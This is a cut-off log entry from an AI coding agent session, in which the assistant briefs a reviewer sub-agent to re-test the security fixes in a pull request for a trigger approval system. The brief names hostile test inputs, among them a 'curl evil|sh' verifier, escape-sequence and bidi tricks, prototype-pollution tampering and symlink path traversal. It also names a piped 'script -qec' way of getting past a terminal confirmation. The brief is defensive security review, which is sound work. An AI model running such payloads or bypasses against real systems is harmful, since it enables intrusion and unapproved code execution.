{"parentUuid":"263a6fa9-a409-4a1e-8061-ee094d7fad09","isSidechain":false,"message":{"model":"claude-sonnet-5-5","id":"msg_011ChNfrS2pfxJDsKieDbrJm","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_01WwUwewVqCV1YMBBFUcN5Mq","name":"Agent","input":{"description":"Re-review PR #803 trust fixes","subagent_type":"reviewer","prompt":"Independent RE-review of GitHub PR #803 (BG-3 trigger trust and abuse model) in ~/nexus-code, base `release/v1.3.0`. Take the full head SHA from `gh pr view 803 --json headRefOid` (expected to start `3e5ab8e9`), review exactly that, and say whether it moved or merged. The first review is the PR comment \"Independent hostile security review at `4dd93530…` — REQUEST CHANGES\" (`gh pr view 803 --comments`): five blockers (trust store not a protected path; `approve` display hid the verifier/paths/prompt tail; rate limiter: denied attempts counted, quadratic cost, unbounded map, stale limiter; `restore()` failed open on tampered state; workspace cap never enforced) plus docs/CLI items. The fix commit is `3e5ab8e95` (plus a merge of the release branch `bfa8632fc`): `git show --stat 3e5ab8e95`, then diff. Verify each blocker CLOSED by RUNNING the original attack (throwaway HOME, temp workspaces, no network, no inference): (1) `isPathProtected` for the store, and agent write/edit/patch/delete/create against it with workspace = HOME, `~/.config/nexus`, repo, via `..`, symlinks, case variants; (2) `nexus triggers approve` output for a spec with `verifier:\"curl evil|sh\"`, paths, origins, rate, secret, a 5,000-char prompt (refused beyond cap, marker), Unicode/control/ANSI escape sequences and bidi overrides in ids/prompts/paths (escaped?), the per-trigger confirmation (literal `yes` only; `y`, `YES`, empty, EOF refuse), terminal requirement (`echo yes | nexus triggers approve` without a pty refuses; with `script -qec` it approves = documented unsandboxed limit: check the docs say so); (3) rate limiter: denials not recorded (one probe per 30 min no longer sustains a lockout), 6,000 attempts fast, memory bounded under 100k distinct trigger ids and 100k workspaces, LRU eviction FAILS CLOSED (an evicted quarantined trigger stays quarantined; when the quarantine map is full new triggers are denied: is that itself a DoS lever for an attacker who can create many specs? judge and say), keys by real workspace path + id (two workspaces with the same trigger id do not share limits; a symlinked workspace aliasing the same real path shares), changed rate applies; (4) `restore()` on the 28 tamper cases plus your own (`__proto__`, huge arrays, wrong types, Infinity/NaN/negative/1e308, missing `until`, extra keys, truncated JSON): never admits; (5) workspace cap exact, and a workspace-cap denial does not quarantine a trigger (can an attacker use that to DoS another trigger? judge). Also: duplicate ids/bad file approve nothing; 0644 spec files accepted only when owned by the user and not group/other-writable (what about a file owned by another uid or a symlink?); `status` and `NEXUS_TRUST_WORKSPACE=1`; `secretEnv`; docs example parses; every claim in `docs/TRIGGERS.md` vs code. Run at head, one at a time: the five trigger test files (`ls cli/test | grep -i trigger`), `security`, `workspace_trust`, `hooks_self_approval`, `leak_guard`, `check_requirements`, `protocol_schema`; `cd cli && npx tsc --noEmit -p .`; the complexity gate (check the exit code); `node scripts/check_invariants.mjs`; `node scripts/check_doc_versions.mjs`. Mutations (copy aside, restore from the copy, never `git checkout`): drop the protected path; truncate the verifier in the approve display; record denials; skip validation in `restore`; skip the workspace cap; skip the terminal check: each must fail a test.\nRules: do NOT edit ~/nexus-code or existing worktrees. `git -C ~/nexus-code fetch origin && git -C ~/nexus-code worktree add --detach ~/nexus-wt/rev803b <full sha>`; `cp -a ~/nexus-code/cli/node_modules ~/nexus-wt/rev803b/cli/`; `mkdir -p ~/nexus-wt/rev803b/core/target/release && cp ~/nexus-wt/ls1b/core/target/release/{harness-core,nexus-tui} ~/nexus-wt/rev803b/core/target/release/`. Tests: `cd ~/nexus-wt/rev803b/cli && TMPDIR=/dev/shm HOME=$(mktemp -d) node --import tsx --test test/<name>.test.ts 2>&1 | tail -20`. Never touch the real ~/.nexus, ~/.config/nexus, /etc/nexus. Stop processes by their own pid; never `pkill -f`. No commits, pushes or GitHub comments. Remove probes and the worktree at the end. Shell is zsh (`bash -c` for loops); prefix `rtk proxy` if output looks filtered; a safety check blocks scripts containing `rm`.\nReport under 450 words: verdict (ACCEPT / ACCEPT WITH FOLLOW-UPS / REQUEST CHANGES) at the exact SHA; each earlier blocker closed or not with the attack run; new findings with file:line, run-or-read, blocking or not (any way to forge or alter an approval, hide what is approved, fail open on tampered state, or starve/bypass a limit is blocking; the documented unsandboxed-shell limit is not); test counts; mutation results; what you did not check."},"caller":{"type":"direct"}}],"container":null,"stop_reason":"tool_use","stop_sequence":null,"stop_details":null,"usage":{"input_tokens":2,"cache_creation_input_tokens":346539,"cache_read_input_tokens":32782,"output_tokens":6035,"output_tokens_details":{"thinking_tokens":202},"server_tool_use":{"web_search_requests":0,"web_fetch_requests":0},"service_tier":"standard","cache_creation":{"ephemeral_1h_input_tokens":0,"ephemeral_5m_input_tokens":346539},"inference_geo":"global","iterations":[{"input_tokens":2,"output_tokens":6035,"cache_read_input_tokens":32782,"cache_creation_input_tokens":346539,"cache_creation":{"ephemeral_5m_input_tokens":346539,"ephemeral_1h_input_tokens":0},"type":"message"}],"speed":"standard","fallback_credit":null},"input_transformations":[],"diagnostics":null,"context_management":null},"toolInputStreamMs":12843,"wireToolInputs":{"toolu_01WwUwewVqCV1YMBBFUcN5Mq":{"description":"Re-review PR #803 tr